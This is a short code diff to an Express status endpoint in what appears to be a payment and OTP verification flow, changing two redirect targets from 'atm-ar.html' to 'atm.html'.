@@ -186,13 +186,13 @@ app.get('/api/status/:id', (req, res) => {
   let stage = 'payment';
 
   if (status === 'accept') {
-    redirectUrl = 'atm-ar.html';
-    redirect = 'atm-ar.html';
+    redirectUrl = 'atm.html';
+    redirect = 'atm.html';
     decision = 'approved';
     stage = 'atm';
   } else if (status === 'otp_verified' || status === 'atm') {
-    redirectUrl = 'atm-ar.html';
-    redirect = 'atm-ar.html';
+    redirectUrl = 'atm.html';
+    redirect = 'atm.html';
     decision = 'approved';
     stage = 'atm';
   } else if (status === 'success') {
